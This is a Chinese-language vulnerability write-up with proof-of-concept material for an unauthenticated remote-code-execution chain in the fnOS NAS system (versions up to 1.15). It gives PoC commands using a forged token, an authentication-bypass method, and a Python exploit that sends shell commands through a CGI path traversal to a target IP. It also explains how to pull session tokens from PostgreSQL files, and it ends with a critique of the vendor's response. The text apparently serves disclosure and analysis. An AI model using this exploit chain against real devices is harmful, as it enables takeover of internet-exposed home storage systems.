## 更新

未授权远程代码执行，影响范围：飞牛OS <= 1.15 (1.18已修复)

无需文件读取RSA私钥，只需使用加密包即可实现命令执行。

```
python poc2.py
```

## 背景

在最近针对飞牛OS的0day攻击中，攻击者可能利用了三个漏洞来实现完整攻击链。

1. **任意文件读取**
2. **认证绕过**
3. **授权命令执行**

其中任意文件读取（<1.15）和授权命令执行已被披露。本文主要对飞牛OS的认证绕过进行分析，并提出另一潜在命令执行路径。

## 一、认证绕过

### 1. 原理分析

#### 1.1 登录逻辑

飞牛OS的登录逻辑如下：

```
用户请求 (Login/ChangePassword)
       |
       v
[ 应用程序 ]
       |
       +---> 1. 验证/修改密码
       |        |
       |        +---> [ 内存缓存 passwd ]
       |        |
       |        +---> [ Linux 系统调用 (crypt/PAM/chpasswd) ] ---> [ /etc/shadow ]
       |        |
       |        +---> [ smbpasswd 命令 ] ------------------------> [ Samba 密码库 ]
       |
       +---> 2. 登录成功后生成
                +---> [ 内存缓存 secret, token ]
                |
                +---> [ PostgreSQL 数据库 ] ---> 表: longtoken
```

授权命令执行需要拿到 secret 或者 token。但读取堆内存略微困难，因此要么读取到 longtoken 转化为 token，要么想办法利用业务漏洞。

#### 1.2 交互逻辑

前端使用 Websocket 协议交互，登录流程如下：

![](./1.png)

#### 1.3 Token生成逻辑

在 /usr/trim/bin/handlers/users.hdl 中的 do_login 函数中包含了 secret, token, longtoken的生成逻辑：

- **Secret (16字节)**：随机生成的 16 字节数据，强制将第 16 字节设置为 `o`。

- **Token (32字节)**：

  - **前 16 字节 (IV)**：由时间戳、计时器和随机数拼接而成。

  - **后 16 字节 (Cipher)**：使用 RSA 密钥对 Secret 进行 AES 加密后的数据。

![](./2.png)

![](./3.png)

**因此 secret 和 token 可以相互转化**，这点很重要。

在 /usr/trim/bin/trim 中的 handle_websocket_packet 函数中包含了鉴权逻辑。

后端能够解析两种类型的包：

- 加密包：不需要 secret 签名
- 明文包：除非req白名单或者设置了no_sign，否则需要secret对请求体签名

看上去可以构造一个加密包，然后使用 longtoken 进行登录，从而绕过签名：

```
{
    "req": "user.tokenLogin",
    "reqid": xxx,
    "token": long_token, 
    "deviceType": xxx,
    "deviceName": xxx,
    "did": xxx,
    "si": xxx,
}
```

遗憾的是，加密包会触发token长度的判断。

![](./4.png)

不过这里存在另一个漏洞：

**验签时如果存在 token 字段，则直接对 token 解密得到 secret，然后对请求体计算签名。**

![](./5.png)

因此，可以自己生成 secret 和 token 绕过认证。

![](./6.png)

![](./10.png)

### 2. PoC

需获取系统中的 `rsa_private_key.pem`（通过任意文件读取漏洞获取）。

```bash
# 1. 命令执行
python poc.py -k ./rsa_private_key.pem rce
# 2. 获取会话token
python poc.py -k ./rsa_private_key.pem login -t 9XlXMOgDAABCfaZpAAAAAAluArwO5RZ2JbzjA6m9hmnjp0KtNSz/SA==
```

## 二、拓展

### 1. CGI路径穿越

/usr/trim/bin/trim_http_cgi 存在一个稍弱的路径穿越、命令执行。

![](./7.png)

filepath.Join并不防御路径穿越，因此能从 /var/apps_ui 穿越到 /var，并执行任意文件。但存在有一些限制：

1. 需要合法token
2. 由于nginx的解析问题，只能穿越一层到 /var

利用思路：需要结合认证绕过和后文提到的postgresql数据库中的longtoken，生成一个合法token，调用文件上传的API，上传一个bash到/var目录。

```python
import requests
import sys

TARGET_IP = "192.168.108.168"
TARGET_PORT = 5666

TOKEN = "g9auUGNTfmkV7fEAVF6qTdH2kQ9CgBkEHmkUBsNvU/8="

url = f"http://{TARGET_IP}:{TARGET_PORT}/cgi/third-party/%2e./bash"

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
    "Authorization": f"token {TOKEN}",
    "Content-Type": "application/x-www-form-urlencoded"
}

commands = "echo 1> /tmp/test.txt"

print(f"[*] Attacking: {url}")
print(f"[*] Using Token: {TOKEN[:10]}...")
print(f"[*] Command: {commands}")

try:
    # 发送 POST 请求
    response = requests.request("POST", url, headers=headers, data=commands, timeout=10)
    
    print("\n[+] Status Code:", response.status_code)
    print("[+] Response Body (Command Output):\n")
    print("-" * 40)
    print(response.text)
    print("-" * 40)

except Exception as e:
    print(f"[-] Error: {e}")
```

### 2. 读取postgresql数据库

PostgreSQL数据库位于 /var/lib/postgresql/*/main/base

该目录下有若干个数据库目录，通常为40000+，需要读取每个数据库下的pg_class表（固定OID为1259），然后从中获取 longtoken 表的 OID。

![](./8.png)

![](./9.png)

## 三、Threat Models with Chinese Characteristics

fnOS is a proprietary operating system developed in China and built on Debian, primarily targeting NAS use cases. According to multiple internet-wide scanning engines, more than 300,000 distinct public IP addresses are currently running fnOS, resulting in a sizable and highly exposed attack surface. In stark contrast to this deployment scale is the level of security awareness demonstrated by the fnOS technical team. When the community initially disclosed evidence of real-world compromises, the official response was to attribute the issue to “users employing insecure HTTP transport,” as if man-in-the-middle attacks represented the full extent of their threat model.

This explanation was quickly eclipsed by a more complete—and considerably less flattering—set of findings from community researchers. The system was shown to contain an arbitrary file read vulnerability (path traversal) that had remained unpatched for over a month, along with a command execution flaw reachable when combined with authentication bypass. Chained together, these issues formed a reliable attack path capable of fully compromising affected systems.

After the attack chain was fully reproduced and the technical details could no longer be ignored, fnOS did not opt for transparency, coordinated disclosure, or a structured vulnerability remediation process. Instead, it adopted a crisis-response approach with distinctly localized characteristics: reclassifying security research and vulnerability disclosure as “rumor spreading,” and publicly threatening to take action against the users involved.

At this point, the incident ceased to be merely a vulnerability in a NAS product. It became a case study in security capability, responsibility, and corporate posture.

## 四、参考

- [fnos 恶意程序分析 - 攻略分享 飞牛私有云论坛 fnOS](https://club.fnnas.com/forum.php?mod=viewthread&tid=53230)
- [公网使用飞牛 nas 的一些安全使用小提示--感谢飞牛官方团队](https://v2ex.com/t/1189392)


